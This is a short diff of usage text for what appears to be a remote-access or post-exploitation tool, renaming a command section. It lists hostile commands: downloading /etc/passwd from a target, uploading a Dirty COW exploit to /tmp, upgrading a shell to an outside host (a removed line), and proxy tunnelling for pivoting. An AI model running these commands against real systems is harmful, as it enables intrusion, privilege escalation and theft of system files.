@@ -50,11 +50,7 @@
 			download --src /etc/passwd --dst ./passwd
 		>> upload
 			upload --src ./dirtyc0w.c --dst /tmp/dirtyc0w.c
-	rsh
-		>> upgrade
-			upgrade --host 1.3.3.7 --port 7331
-		>> pty
-	termite
+	agent
 		>> proxy
 			proxy --create --type pull --remote-host 192.168.1.1 --remote-port 22 --local-port 1022
 			proxy --create --type push --local-host 127.0.0.1 --local-port 1080 --remote-port 1090
